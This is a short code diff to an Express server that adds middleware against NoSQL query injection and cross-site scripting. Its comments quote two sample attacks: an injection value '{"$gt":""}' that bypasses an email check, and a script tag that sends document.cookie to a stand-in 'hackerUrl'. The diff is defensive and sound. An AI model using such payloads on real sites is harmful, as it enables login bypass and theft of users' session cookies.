@@ -34,6 +34,16 @@ cloudinary.config({
   api_secret: process.env.CLOUD_API_SECRET,
 });
 
+// Data Sanitization against NoSQL Query Injection
+// Ex:- "email": {"$gt":""}, any random email will be accepted
+const mongoSantize = require("express-mongo-sanitize");
+app.use(mongoSantize());
+// Data Sanitization against XSS
+// Ex: <script>fetch(hackerUrl, document.cookie)</script>
+// Adds this as a innerText instead of innerHTML in the DOM which actually runs the script
+const xss = require("xss-clean");
+app.use(xss());
+
 // routers
 const { appRouter } = require("./routes/authRouter");
 const { notFound } = require("./middlewares/notFound");
